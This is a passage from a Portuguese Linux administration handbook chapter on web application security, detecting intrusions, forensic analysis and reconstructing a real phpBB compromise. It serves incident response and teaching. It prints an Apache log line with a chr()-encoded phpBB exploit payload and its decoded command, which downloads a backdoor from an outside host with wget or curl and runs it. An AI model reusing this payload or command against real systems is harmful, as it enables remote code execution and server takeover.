      <para>O caráter universal das aplicações web levou à sua proliferação. Diversas são freqüentemente executadas em paralelo: um webmail, um wiki, algum sistema de groupware, fóruns, uma galeria de fotos, um blog, e assim por diante. Muitas dessas aplicações dependem da pilha "LAMP" (<emphasis>Linux, Apache, MySQL, PHP</emphasis>). Infelizmente, muitas dessas aplicações também foram escritas sem considerar muito os problemas de segurança. Dados provenientes do exterior são, muitas vezes, utilizados com pouca ou nenhuma validação. Proporcionando valores criados especialmente para serem usados para destruir uma chamada para um comando de modo que um outro seja executado em vez disso. Muitos dos problemas mais óbvios foram corrigidos com o parrar do tempo, mas novos problemas de segurança surgem regularmente.</para>

      <sidebar>
        <title><emphasis>VOCABULARIO</emphasis> SQL injection</title>

	<para>Quando um programa insere dados em consultas SQL de uma maneira segura, torna-se vulnerável a SQL injections; este nome abrange o ato de alterar um parâmetro de tal forma que a consulta real executada pelo programa é diferente da pretendida, quer para danificar o banco de dados ou de acesso aos dados que normalmente não devem ser acessíveis. <ulink type="block" url="http://en.wikipedia.org/wiki/SQL_Injection" /></para>
        <indexterm><primary>SQL injection</primary></indexterm>
      </sidebar>

      <para>Atualizar aplicações web regularmente é, portanto, uma obrigação, para que qualquer cracker (se um atacante ou um profissional script kiddy) possa explorar uma vulnerabilidade conhecida. O risco real depende do caso, e varia de destruição de dados a execução de código arbitrário, incluindo desfiguração do site.</para>
    </section>
    <section>
      <title>Sabendo O Que Esperar</title>

      <para>A vulnerabilidade em uma aplicação web é frequentemente utilizada como ponto de partida para as tentativas de craqueamento. O que se segue são uma breve revisão das possíveis consequências.</para>

      <sidebar>
        <title><emphasis>OLHADA RAPIDA</emphasis> Filtrando consultas HTTP</title>

	<para>Apache 2 inclui módulos que permitindo a filtragem da entrada de consultas HTTP. Isto permite o bloqueio de alguns vetores de ataque. Por exemplo, limitando a duração dos parâmetros pode impedir o estouro do buffer. Mais genericamente, pode se validar os parâmetros antes mesmo que eles passem para a aplicação web e restringir o acesso ao longo de muitos critérios. Isso pode até ser combinado com atualizações dinâmicas do firewall, de modo que se um cliente violar uma das regras é proibido de acessar o servidor web por um determinado tempo.</para>

	<para>Configurando estas verificações podem ser uma tarefa longa e complicada, mas pode pagar quando a aplicação web a ser implantada tiver um histórico duvidoso, onde a segurança é interesse.</para>

	<para><emphasis>mod-security2</emphasis> (no pacote <emphasis role="pkg">libapache2-mod-security2</emphasis>) é o tal módulo principal. Ele até mesmo vem com muitas regras prontas-para-uso próprias (no pacote <emphasis role="pkg">modsecurity-crs</emphasis>) que você pode facilmente habilitar.</para>
        <indexterm><primary><emphasis role="pkg">libapache-mod-security</emphasis></primary></indexterm>
        <indexterm><primary><emphasis>mod-security</emphasis></primary></indexterm>
      </sidebar>

      <para>As consequências de uma invasão terá vários níveis de evidência, dependendo das motivações do atacante. <emphasis>Script-kiddies</emphasis> só aplicam receitas que encontram em sites, a maioria das vezes, eles desfigurar uma página web ou excluir dados. Em casos mais sutis, eles adicionam conteúdo invisíveis para páginas web, de modo a melhorar encaminhamentos para seus próprios sites em motores de busca.</para>

      <para>Um atacante mais avançado vai além disso. Um cenário de desastre poderia continuar da seguinte maneira: o atacante ganha a habilidade de executar comandos como o usuário <literal>www-data</literal>, mas a execução de um comando requer muitas manipulações. Para tornar sua vida mais fácil, eles instalam outras aplicações web especialmente concebidas para executar remotamente vários tipos de comandos, como a navegação no sistema de arquivos, examinando as permissões de upload, ou download de arquivos, execução de comandos, e até mesmo fornecer um escudo de rede. Muitas vezes, a vulnerabilidade permite execução de um <command>wget</command> que vai baixar algum malware em <filename>/tmp/</filename>, então o executa. O malware geralmente é baixado de um site estrangeiro que foi previamente comprometido, a fim de cobrir faixas e tornar mais difícil encontrar a verdadeira origem do ataque.</para>

      <para>Neste ponto, o invasor tem bastante liberdade de movimento que muitas vezes instalar um IRC <emphasis>bot</emphasis> (um robô que se conecta a um servidor IRC e pode ser controlado por este canal). Este robô é frequentemente usado para compartilhamento de arquivos ilegais (cópias não autorizadas de filmes ou software, entre outros). Um determinado invasor pode querer ir ainda mais longe. A conta <literal>www-data</literal> não permite o acesso total à máquina, e o invasor vai tentar obter privilégios de administrador. Ora, isso não deve ser possível, mas se a aplicação web não está atualizada, as chances são de que os programas do kernel e outros também estejam desatualizados, o que às vezes se segue uma decisão do administrador que, apesar de saber sobre a vulnerabilidade, negligenciado para atualizar o sistema, pois não existem usuários locais. O atacante pode então aproveitar essa segunda vulnerabilidade para obter acesso root.</para>

      <sidebar>
        <title><emphasis>VOCABULARIO</emphasis> Escalonamento de Privilégios</title>

	<para>Este termo abrange qualquer coisa que pode ser usada para obter as permissões de mais do que um determinado utilizador deve ter normalmente. O programa <command>sudo</command> é projetado justamente com o proposito de dar direitos administrativos para alguns usuários. Mas o termo também é usado para descrever o ato de um invasor explorar uma vulnerabilidade para obter direitos indevidos.</para>
      </sidebar>

      <para>Agora, o atacante é dono da máquina; eles costumam tentar manter esse acesso privilegiado pelo maior tempo possível. Isso envolve a instalação de um <emphasis>rootkit</emphasis>, um programa que irá substituir alguns componentes do sistema para que o invasor seja capaz de obter os privilégios de administrador novamente em um momento posterior, o rootkit também tenta esconder a sua própria existência como tambem quaisquer vestígios da intrusão. U subvertido programa <command>ps</command> irá deixar de listar alguns processos, <command>netstat</command> não vai listar algumas das conexões ativas e assim por diante. Usando as permissões de root, o invasor foi capaz de observar todo o sistema, mas não encontrou dados importantes, então vai tentar acessar outras máquinas na rede corporativa. Analisando a conta do administrador e os arquivos de histórico, o atacante acha que as máquinas são acessadas rotineiramente. Ao substituir <command>sudo</command> ou <command>ssh</command> com um programa subvertido, o invasor pode interceptar algumas das senhas do administrador, que irá utilizar nos servidores detectados ... e a intrusão pode se propagar a partir de então.</para>

      <para>Este é um cenário de pesadelo pode ser evitado através de várias medidas. As próximas seções descrevem algumas dessas medidas.</para>
    </section>
    <section id="sect.choosing-the-software-wisely">
      <title>Escolhendo o Software Sabiamente</title>

      <para>Uma vez que os problemas potenciais de segurança são conhecidos, eles devem ser levados em conta, em cada passo do processo de implantação de um serviço, especialmente quando se escolhe o software para instalar. Muitos sites, como <literal>SecurityFocus.com</literal>, mantem uma lista de vulnerabilidades recém-descobertas, que podem dar uma idéia de um histórico de segurança antes de algum software especial ser implantado. Claro, essa informação deve ser equilibrada com a popularidade do referido software: um programa mais amplamente usado é um alvo mais tentador, e será examinado mais de perto como conseqüência. Por outro lado, um programa de nicho pode estar cheio de buracos de segurança que nunca serao divulgados devido a uma falta de interesse em uma auditoria de segurança.</para>

      <sidebar>
        <title><emphasis>VOCABULARIO</emphasis> Auditoria de Seguranca</title>

	<para>A auditoria de segurança é o processo de leitura cuidadosa e analise do código fonte de algum software, procurando por vulnerabilidades de segurança em potencial que poderiam conter. Estas auditorias são geralmente pró-ativas e são realizadas para garantir que um programa atenda aos requisitos de segurança determinados.</para>
      </sidebar>

      <para>No mundo do Software Livre, geralmente há um amplo espaço para a escolha, e escolher um pedaço de software em detrimento de outro deve ser uma decisão com base nos critérios que se aplicam localmente. Mais características implicam num aumento do risco de um vulnerabilidade escondida no código; escolher o programa mais avançado para uma tarefa pode realmente ser contraproducente, e uma melhor abordagem é, geralmente, para escolher o programa mais simples que atenda aos requisitos.</para>

      <sidebar>
        <title><emphasis>VOCABULARIO</emphasis> Zero-day exploit</title>

	<para>Um ataque <emphasis>zero-day exploit</emphasis> é difícil de evitar, o termo abrange uma vulnerabilidade que ainda não é conhecida pelos autores do programa.</para>
      </sidebar>
    </section>
    <section id="sect.managing-a-machine-as-a-whole">
      <title>Gerenciando uma Máquina como um Todo</title>

      <para>A maioria das distribuições Linux instalam por padrão uma série de serviços Unix e muitas ferramentas. Em muitos casos, estes serviços e ferramentas não são necessários para os fins de reais para que o administrador configure a máquina. Como orientação geral em matéria de segurança, softwares desnecessários é melhor desinstalado. Na verdade, não tem sentido garantir um servidor FTP, se uma vulnerabilidade em um serviço diferente, não utilizado pode ser usado para obter privilégios de administrador na máquina inteira.</para>

      <para>Seguindo o mesmo raciocínio, firewalls, frequentemente sao configurados para permitir apenas acesso aos serviços que se destinam a ser acessíveis ao público.</para>

      <para>Computadores atuais são poderosos o suficiente para permitir a hospedagem de vários serviços na mesma máquina física. De um ponto de vista económico, uma tal possibilidade é interessante: um só computador para administrar, menor consumo de energia, e assim por diante. Do ponto de vista da segurança, no entanto, esta escolha pode ser um problema. Um serviço comprometido pode levar o acesso a toda a máquina, que por sua vez compromete os outros serviços hospedados no mesmo computador. Este risco pode ser atenuado através do isolamento dos serviços. Isto pode ser alcançado tanto com virtualização (cada serviço sendo hospedado em uma máquina virtual dedicada ou um container), ou com o AppArmor/SELinux (cada serviço daemon tendo um conjunto de permissões adequadamente projetado).</para>
    </section>
    <section id="sect.users-are-players">
      <title>Os Usuários São Jogadores</title>

      <para>Discutir segurança imediatamente traz à mente proteção contra ataques de crackers anônimos escondidos na selva da Internet, mas um fato muitas vezes esquecido é que corre o risco de vir também de dentro: um funcionário prestes a deixar a empresa poderia baixar arquivos confidenciais sobre os projetos importantes e vendê-los aos concorrentes, um vendedor de negligente poderia deixar sua mesa sem bloquear a sessão durante um encontro com uma nova perspectiva, um usuário desajeitado poderia excluir o diretório errado por engano, e assim por diante.</para>

      <para>A resposta a estes riscos podem envolver soluções técnicas: não mais do que as permissões necessárias devem ser concedidas aos usuários, e backups regulares são uma obrigacao. Mas em muitos casos, a protecção adequada vai envolver treinamento de usuários para evitar os riscos.</para>

      <sidebar>
        <title><emphasis>BLOQUEIO RAPIDO</emphasis> <emphasis role="pkg">autolog</emphasis></title>

	<para>O pacote <emphasis role="pkg">autolog</emphasis> fornece um programa que desconecta automaticamente usuários inativos depois de um atraso configurável. Ele também permite matar processos de usuário que persistem após o término da sessão, impedindo os usuários de executar daemons.</para>
      </sidebar>
    </section>
    <section id="sect.physical-security">
      <title>Seguranca Fisica</title>

      <para>Não faz sentido garantir os serviços e redes, se os próprios computadores não estiverem protegidos. Dados importantes merecem ser armazenados em discos rígidos hot-swappable em RAID, por que discos rígidos falham eventualmente e a disponibilidade dos dados é um ponto obrigatório. Mas se qualquer entregador de pizza pode entrar no prédio furtivo, na sala do servidor e fugir com alguns discos rígidos, uma parte importante da segurança não está cumprida. Quem pode entrar na sala do servidor? O acesso está monitorado? Estas questões merecem ser consideradas (e uma resposta) quando a segurança física está sendo avaliada.</para>

      <para>A segurança física inclui levar em consideração também os riscos de acidentes, como incêndios. Este risco particular é o que justifica armazenar as mídias de backup em um prédio separado, ou pelo menos em um cofre à prova de fogo.</para>
    </section>
    <section>
      <title>Responsabilidade legal</title>

      <para>Um administrador tem, mais ou menos implicitamente, a confiança de seus usuários, bem como os usuários da rede em geral. Eles devem, portanto, evitar a negligência que as pessoas malignas poderiam explorar.</para>

      <para>Um invasor assume o controle da sua máquina, em seguida, a utiliza como uma base para avancar (conhecido como “relay system - sistema de revezamento") da quale para realizar outras atividades nefastas poderia causar problemas legais para você, uma vez que a parte que atacou inicialmente iria ver o ataque proveniente de seu sistema e, portanto, considerá-lo como o atacante (ou como cúmplice). Em muitos casos, o atacante usará o servidor como um relé para enviar spam, que não deve ter muito impacto (exceto possivelmente registro em listas negras que poderiam restringir a sua capacidade de enviar e-mails legítimos), mas não vai ser agradável, no entanto. Em outros casos, o problema mais importante pode ser causado a partir de sua máquina, por exemplo, seria ataques de negação de serviço. Isso, às vezes, induz a perda de receitas, uma vez que os serviços legítimos não estará disponível e os dados podem ser destruídos, às vezes isso também implicaria um custo real, porque a parte atacada pode iniciar um processo judicial contra você. Os dententores dos direitos podem processá-lo se uma cópia não autorizada de uma obra protegida por direitos autorais é compartilhada a partir do servidor, bem como outras empresas obrigadas por acordos de nível de serviço, se eles são obrigados a pagar multas após o ataque de sua máquina.</para>

      <para>Quando estas situações ocorrem, afirmar inocência não é geralmente suficiente; no mínimo, você vai precisar de provas convincentes que mostram a atividade suspeita em seu sistema que vem de um determinado endereço IP. Isso não será possível se você negligenciar as recomendações deste capítulo e deixar o invasor obter acesso a uma conta privilegiada (root, em particular) e usá la para cobrir seus rastros.</para>
    </section>
  </section>
  <section id="sect.dealing-with-compromised-machine">
    <title>Lidando com uma máquina comprometida</title>

    <para>Apesar das melhores intenções e por mais cuidadosamente concebido política da segurança, um administrador, eventualmente, enfrenta um ato de desvio. Esta seção fornece algumas orientações sobre como reagir quando confrontado com estas circunstâncias infelizes.</para>
    <section>
      <title>Detectando e Visualizando a Intrusão do cracker</title>

      <para>A primeira etapa de reagir a quebra é estar ciente de tal ato. Isso não é auto-evidente, especialmente sem uma infra-estrutura adequada de vigilância.</para>

      <para>Atos Cracking muitas vezes não são detectados até que eles têm conseqüências diretas sobre os serviços legítimos hospedados na máquina, como conexões debilitadas, alguns usuários incapazes de se conectar, ou qualquer outro tipo de avaria. Diante desses problemas, o administrador precisa dar uma boa olhada para a máquina e examinar cuidadosamente o que se comporta mal. Este é geralmente o momento em que eles descobrem um processo incomum, por exemplo, um chamado <literal>apache</literal> em vez do padrão <literal>/usr/sbin/apache2</literal>. Se seguirmos esse exemplo, a coisa a fazer é observar seu identificador de processo, e verificar <filename>/proc/<replaceable>pid</replaceable>/exe</filename> para ver qual programa está executando este processo atualmnete:</para>

      <screen>
<computeroutput># </computeroutput><userinput>ls -al /proc/3719/exe</userinput>
<computeroutput>lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</computeroutput>
      </screen>

      <para>Um programa instalado em <filename>/var/tmp/</filename> e funcionando como servidor web? Sem deixar dúvida, a máquina está comprometida.</para>

      <para>Este é apenas um exemplo, mas muitas outras dicas podem alertar o administrador:</para>
      <itemizedlist>
        <listitem>
	  <para>uma opção para um comando que não funciona mais; a versão do software que o comando pretende ser não coincide com a versão que está supostamente instalada de acordo com <command>dpkg</command>;</para>
        </listitem>
        <listitem>
	  <para>um prompt de comando ou uma sessão de saudação indicando que a última conexao veio de um servidor desconhecido em outro continente;</para>
        </listitem>
        <listitem>
	  <para>erros causados pela partição <filename>/tmp/</filename> estar cheia, o que acabou por estar cheio de cópias ilegais de filmes;</para>
        </listitem>
        <listitem>
	  <para>entre outros.</para>
        </listitem>
      </itemizedlist>
    </section>
    <section>
      <title>Colocando o servidor Off-Line</title>

      <para>Em qualquer dos casos porém, os mais exóticos, a quebra vem da rede, e o invasor precisa de uma rede trabalhando para alcançar as suas metas (acesso a dados confidenciais, compartilhar arquivos clandestinos, ocultar a sua identidade utilizando a máquina como de um retransmissor e assim sucessivamente). Desconectar o computador da rede impedirá que o atacante alcane esses objetivos, se eles não conseguiram fazer isso ainda.</para>

      <para>Isso só é possível se o servidor está fisicamente acessível. Quando o servidor está hospedado em uma hospedagem no centro provedor de dados do outro lado do país, ou se o servidor não está acessível por qualquer outro motivo, é geralmente uma boa idéia começar a reunir alguma informação importante (ver <xref linkend="sect.keeping-everything-that-could-be-used-as-evidence" />, <xref linkend="sect.forensic-analysis" /> e <xref linkend="sect.reconstituting-the-attack-scenario" /> ), então isolar o servidor tanto quanto possível, fechando tantos serviços quanto possível (geralmente tudo, menos o <command>sshd</command>). Este caso ainda é estranho, pois não se pode descartar a possibilidade de o atacante ter acesso SSH como o administrador tem, o que torna mais difícil "limpar" as máquinas.</para>
    </section>
    <section id="sect.keeping-everything-that-could-be-used-as-evidence">
      <title>Mantendo Tudo que Poderia Ser Usado como Evidência</title>

      <para>Compreender o ataque e/ou ação legal contra os atacantes envolvente requer uma tomada de cópias de todos os elementos relevantes, o que inclui o conteúdo do disco rígido, uma lista de todos os processos em execução, e uma lista de todas conexões abertas. O conteúdo da memória RAM também poderia ser usado, mas é raramente utilizado na prática.</para>

      <para>No calor da ação, os administradores são muitas vezes tentados a realizar muitas verificações na máquina comprometida; esta geralmente não é uma boa idéia. Cada comando é potencialmente subvertido e pode apagar elementos de prova. Os cheques devem ser restritas ao conjunto mínimo (<command>netstat -tupan</command> para conexões de rede, <command>ps auxf</command> para uma lista de processos, <command>ls -alR /proc/[0-9]*</command> para um pouco mais de informação sobre a execução de programas), e cada seleção realizada deve ser cuidadosamente anotada.</para>

      <sidebar>
        <title><emphasis>ATENÇÃO</emphasis> Analise Quente</title>

	<para>Embora possa parecer tentador analisar o sistema como ele executa, especialmente quando o servidor não é fisicamente acessível, este é melhor evitar: simplesmente você não pode confiar nos programas instalados no sistema comprometido. É bem possível que um subvertido comando <command>ps</command> para esconder alguns processos, ou para um comando <command>ls</command> subvertido para esconder arquivos, às vezes até mesmo o kernel é comprometido!</para>

	<para>Se uma análise tão quente ainda é necessária, deve ser tomado o cuidado de usar somente os bons programas conhecidos. Uma boa maneira de fazer isso seria ter um CD de recuperação com programas imaculados, ou um compartilhamento de rede somente leitura. No entanto, mesmo essas contramedidas podem não ser suficientes se o kernel em si está comprometido.</para>
      </sidebar>

      <para>Uma vez que os elementos "dinâmicos" foram salvos, o próximo passo é armazenar uma imagem completa do disco rígido. Fazer tal imagem é impossível se o sistema ainda está executando, é por isso que deve ser remontado somente para leitura. A solução mais simples é muitas vezes parar o servidor brutalmente (após a execucao de <command>sync</command>) e reiniciá-lo em um CD de recuperação. Cada partição deve ser copiada com uma ferramenta como o <command>dd</command>, estas imagens podem ser enviadas para outro servidor (possivelmente com a muito conveniente ferramenta <command>nc</command>). Outra possibilidade pode ser ainda mais simples: é só pegar o disco da máquina e substituí-lo por um novo que pode ser reformatado e reinstalado.</para>
    </section>
    <section>
      <title>Reinstalando</title>
      <indexterm><primary>backdoor</primary></indexterm>

      <para>O servidor não deve ser trazido de volta em linha sem uma reinstalação completa. Se o comprometimento foi grave (se privilégios administrativos foram obtidos), não há quase nenhuma outra maneira de ter certeza de que estamos livres de tudo o que o invasor pode ter deixado para trás (particularmente <emphasis>backdoors</emphasis>). Naturalmente, todas últimas atualizações de segurança devem também ser aplicadas de modo a conectar a vulnerabilidade utilizada pelo invasor. O ideal, analisando o ataque deve apontar para este vetor de ataque, para que se possa ter certeza de efetivamente corrigi-lo, caso contrário, só se pode esperar que a vulnerabilidade foi um daqueles fixados pelas atualizações.</para>

      <para>Reinstalar um servidor remoto não é sempre fácil, pode envolver a assistência da empresa de hospedagem, porque nem todas empresas oferecem sistemas automatizados de reinstalação. Cuidados devem ser tomados para não reinstalar a máquina a partir de backups feitos depois do compromisso. Idealmente, os dados devem ser restaurados, o próprio software deve ser reinstalado a partir da mídia de instalação.</para>
    </section>
    <section id="sect.forensic-analysis">
      <title>Analise Fonrense</title>

      <para>Agora que o serviço foi restaurado, é hora de dar uma olhada nas imagens de disco do sistema comprometido a fim de compreender o vetor de ataque. Ao montar essas imagens, deve se tomar cuidado e usar as opções <literal>ro, nodev, noexec, noatime</literal> de modo a evitar alteração dos conteúdos (incluindo marcas de tempo de acesso a arquivos) ou a execução de programas comprometidos por engano.</para>

      <para>Refazendo um cenário de ataque geralmente envolve olhar para tudo o que foi modificado e executado:</para>
      <itemizedlist>
        <listitem>
	  <para>arquivos <filename>.bash_history</filename> muitas vezes prevem uma leitura muito interessante;</para>
        </listitem>
        <listitem>
	  <para>o mesmo acontece listando arquivos que foram recentemente criados, modificados ou acessados;</para>
        </listitem>
        <listitem>
	  <para>o comando <command>strings</command> ajuda a identificar programas instalados pelo atacante, extraindo seqüências de texto de um binário;</para>
        </listitem>
        <listitem>
	  <para>os arquivos de log em <filename>/var/log/</filename> muitas vezes permitem reconstruir uma cronologia dos eventos;</para>
        </listitem>
        <listitem>
	  <para>ferramentas special-purpose também permitem restaurar o conteúdo de arquivos potencialmente excluídos, incluindo arquivos de log que os atacantes muitas vezes excluíram.</para>
        </listitem>
      </itemizedlist>

      <para>Algumas dessa operações podem ser facilitadas com softwares especializados. Em particular, o pacote <emphasis role="pkg">sleuthkit</emphasis> fornece muitas ferramentas para analisar um sistema de arquivos. Seu uso é facilitado pela interface gráfica <emphasis>Autopsy Forensic Browser</emphasis> (no pacote de <emphasis role="pkg">autopsy</emphasis> ).</para>
      <indexterm><primary>Navegador Forense Autopsy</primary></indexterm>
      <indexterm><primary>O Kit Sleuth</primary></indexterm>
    </section>
    <section id="sect.reconstituting-the-attack-scenario">
      <title>Reconstituindo o Cenário do Ataque</title>

      <para>Todos os elementos recolhidos durante a análise devem se encaixar como peças de um quebra-cabeça, a criação dos primeiros arquivos suspeitos é muitas vezes relacionada aos registros que comprovam a violação. A exemplo do mundo real deve ser mais explícito do que longas divagações teóricas.</para>

      <para>O registo seguinte foi extraido de um Apache <filename>access.log</filename>:</para>

      <programlisting>
www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] "GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1" 200 27969 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
      </programlisting>

      <para>Este exemplo corresponde a exploração de uma antiga vulnerabilidade de segurança em phpBB.<ulink type="block" url="http://secunia.com/advisories/13239/" /> <ulink type="block" url="http://www.phpbb.com/phpBB/viewtopic.php?t=240636" /></para>

      <para>Decodificar esta longa URL leva ao entendimento de que o atacante conseguiu executar algum código PHP, chamado: <command>system("cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;")</command>. Na verdade, um arquivo <filename>bd</filename> foi encontrado em <filename>/tmp/</filename>. Executando <command>strings /mnt/tmp/bd</command> retorna, entre outros textos, <literal>PsychoPhobia Backdoor is starting...</literal> Isso realmente parece um backdoor.</para>

      <para>Algum tempo depois, esse acesso foi usado para fazer o download, instalar e executar um <emphasis>bot - robô</emphasis> de IRC, conectado a uma rede IRC subterrânea. O robô pode então ser controlado através deste protocolo e instruido realizar download de arquivos para compartilhamento. Este programa ainda tem o seu próprio arquivo de log:</para>

      <programlisting>** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)
** 2004-11-29-19:50:15: DCC CHAT attempt authorized from GAB!SEX@RIZON-2EDFBC28.POOL8250.INTERBUSINESS.IT
** 2004-11-29-19:50:15: DCC CHAT received from GAB, attempting connection to 82.50.72.202:1024
** 2004-11-29-19:50:15: DCC CHAT connection suceeded, authenticating
** 2004-11-29-19:50:20: DCC CHAT Correct password
(...)
** 2004-11-29-19:50:49: DCC Send Accepted from ReV|DivXNeW|502: In.Ostaggio-iTa.Oper_-DvdScr.avi (713034KB)
(...)
** 2004-11-29-20:10:11: DCC Send Accepted from GAB: La_tela_dell_assassino.avi (666615KB)
(...)
** 2004-11-29-21:10:36: DCC Upload: Transfer Completed (666615 KB, 1 hr 24 sec, 183.9 KB/sec)
(...)
** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)</programlisting>

      <para>Esses registros mostram que dois arquivos de vídeo foram armazenados no servidor por meio do endereço IP 82.50.72.202.</para>

      <para>Em paralelo, o atacante também baixou um par de arquivos adicionais, <filename>/tmp/pt</filename> e <filename>/tmp/loginx</filename>. Executando esses arquivos através do <command>strings</command> resulta sequências de caracteres 
como <foreignphrase>Shellcode placed at 0x%08lx</foreignphrase> e <foreignphrase>Now wait for suid shell...</foreignphrase>. Estes parecem programas que exploram vulnerabilidades locais para obter privilégios administrativos. Será que chegam ao seu destino? Neste caso, provavelmente não, uma vez que nenhum arquivo parece ter sido modificado após a violação inicial.</para>

      <para>Neste exemplo, a intrusão toda foi reconstruída, e pode-se deduzir que o invasor foi capaz de tirar vantagem do sistema comprometido por cerca de três dias, mas o elemento mais importante na análise é que a vulnerabilidade tenha sido identificada, e o administrador pode esta certo de que a nova instalação realmente corrigiu a vulnerabilidade.</para>
    </section>
  </section>
</chapter>
